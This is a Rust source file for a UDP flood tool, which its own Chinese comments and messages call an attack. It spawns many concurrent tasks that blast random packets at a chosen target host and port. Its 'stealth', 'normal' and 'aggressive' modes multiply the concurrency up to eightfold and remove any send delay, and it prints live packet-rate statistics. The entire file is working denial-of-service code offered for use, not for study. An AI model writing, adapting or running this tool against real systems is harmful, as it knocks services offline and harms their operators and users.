use crate::stats::{Stats, StatsArc};
use indicatif::{ProgressBar, ProgressStyle};
use std::net::UdpSocket;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::time::sleep;
use rand::Rng;

pub struct UdpFloodConfig {
    pub target: String,
    pub port: u16,
    pub connections: usize,
    pub duration: u64,
    pub packet_size: usize,
    pub mode: String,
}

pub async fn run_udp_flood(config: UdpFloodConfig) {
    println!("🌊 UDP洪水攻击启动");
    println!("目标: {}:{}", config.target, config.port);
    println!("攻击模式: {}", config.mode);
    println!("并发连接: {}", config.connections);
    println!("持续时间: {}秒", config.duration);
    println!("数据包大小: {} 字节", config.packet_size);
    println!();

    let stats = StatsArc::default();
    let (min_delay, max_delay) = get_udp_delay_by_mode(&config.mode);
    let adjusted_connections = adjust_udp_connections_by_mode(config.connections, &config.mode);

    let progress_bar = ProgressBar::new(config.duration);
    progress_bar.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} ({eta})")
            .unwrap()
            .progress_chars("#>-"),
    );

    let start_time = Instant::now();
    let stats_clone = stats.clone();
    let mut tasks = Vec::new();

    for _ in 0..adjusted_connections {
        let stats_clone = stats_clone.clone();
        let target = config.target.clone();
        let port = config.port;
        let packet_size = config.packet_size;
        let mode = config.mode.clone();

        let task = tokio::spawn(async move {
            // 创建UDP socket
            let socket = match UdpSocket::bind("0.0.0.0:0") {
                Ok(socket) => socket,
                Err(e) => {
                    eprintln!("无法创建UDP socket: {}", e);
                    return;
                }
            };

            // 设置socket选项（如果支持）
            #[cfg(unix)]
            {
                socket.set_send_buffer_size(65536).ok();
                socket.set_recv_buffer_size(65536).ok();
            }

            // 生成随机数据包
            let packet_data = generate_random_packet(packet_size);
            let target_addr = format!("{}:{}", target, port);

            loop {
                let request_start = Instant::now();

                match socket.send_to(&packet_data, &target_addr) {
                    Ok(bytes_sent) => {
                        let success = bytes_sent > 0;
                        {
                            let mut stats = stats_clone.lock().unwrap();
                            stats.add_request(success, bytes_sent as u64, 0);
                        }
                    }
                    Err(e) => {
                        {
                            let mut stats = stats_clone.lock().unwrap();
                            stats.add_request(false, packet_size as u64, 0);
                        }
                        eprintln!("UDP发送错误: {}", e);
                    }
                }

                // 根据模式调整延迟 - 极限性能优化
                let elapsed = request_start.elapsed();
                if elapsed < Duration::from_millis(0) { // 极限减少最小延迟
                    let random_delay = rand::thread_rng().gen_range(min_delay..max_delay);
                    sleep(Duration::from_millis(random_delay)).await;
                }
            }
        });
        tasks.push(task);
    }

    // 实时统计监控任务
    let stats_monitor = stats.clone();
    let monitor_task = tokio::spawn(async move {
        let mut last_stats = crate::stats::Stats::default();
        let mut last_time = Instant::now();

        loop {
            sleep(Duration::from_secs(1)).await;
            let current_stats = stats_monitor.lock().unwrap();
            let current_time = Instant::now();
            let time_diff = current_time.duration_since(last_time).as_secs_f64();
            let requests_diff = current_stats.total_requests - last_stats.total_requests;
            let rps = requests_diff as f64 / time_diff;

            println!("\r📊 UDP RPS: {:.0} | 成功: {} | 失败: {} | 总计: {}", 
                rps, 
                current_stats.successful_requests, 
                current_stats.failed_requests, 
                current_stats.total_requests
            );

            last_stats = current_stats.clone();
            last_time = current_time;
        }
    });

    // 监控进度
    let progress_task = tokio::spawn(async move {
        let mut elapsed = 0u64;
        while elapsed < config.duration {
            sleep(Duration::from_secs(1)).await;
            elapsed += 1;
            progress_bar.inc(1);
        }
        progress_bar.finish_with_message("UDP攻击完成！");
    });

    // 等待攻击完成
    tokio::select! {
        _ = progress_task => {
            println!("\n✅ UDP攻击完成！");
        }
    }

    // 取消所有正在运行的任务
    for task in tasks {
        task.abort();
    }
    monitor_task.abort();

    // 显示最终统计信息
    let final_stats = stats.lock().unwrap();
    let elapsed = start_time.elapsed();
    let total_rps = final_stats.total_requests as f64 / elapsed.as_secs_f64();

    println!("\n📊 UDP攻击最终统计:");
    println!("总运行时间: {:.2}秒", elapsed.as_secs_f64());
    println!("目标: {}:{}", config.target, config.port);
    println!("并发连接数: {}", adjusted_connections);
    println!("总数据包: {}", final_stats.total_requests);
    println!("成功发送: {}", final_stats.successful_requests);
    println!("发送失败: {}", final_stats.failed_requests);
    println!("平均RPS: {:.0}", total_rps);
    println!("发送字节: {} MB", final_stats.bytes_sent / 1024 / 1024);
    println!("成功率: {:.1}%", 
        (final_stats.successful_requests as f64 / final_stats.total_requests as f64) * 100.0
    );
}

// 生成随机UDP数据包
fn generate_random_packet(size: usize) -> Vec<u8> {
    let mut packet = Vec::with_capacity(size);
    let mut rng = rand::thread_rng();
    
    for _ in 0..size {
        packet.push(rng.gen());
    }
    
    packet
}

// 根据UDP攻击模式调整延迟 - 极限性能优化
fn get_udp_delay_by_mode(mode: &str) -> (u64, u64) {
    match mode.to_lowercase().as_str() {
        "stealth" => (1, 10),         // 隐蔽模式：1-10ms (极限减少延迟)
        "normal" => (0, 1),            // 正常模式：0-1ms (极限减少延迟)
        "aggressive" => (0, 0),        // 激进模式：0-0ms (无延迟)
        _ => (0, 1),
    }
}

// 根据UDP攻击模式调整并发数 - 极限性能优化
fn adjust_udp_connections_by_mode(base_connections: usize, mode: &str) -> usize {
    match mode.to_lowercase().as_str() {
        "stealth" => (base_connections as f64 * 1.5) as usize,   // 增加50% (提高隐蔽性)
        "normal" => (base_connections as f64 * 4.0) as usize,    // 增加300% (极限提高效果)
        "aggressive" => (base_connections as f64 * 8.0) as usize, // 增加700% (极限提高)
        _ => (base_connections as f64 * 4.0) as usize,
    }
} 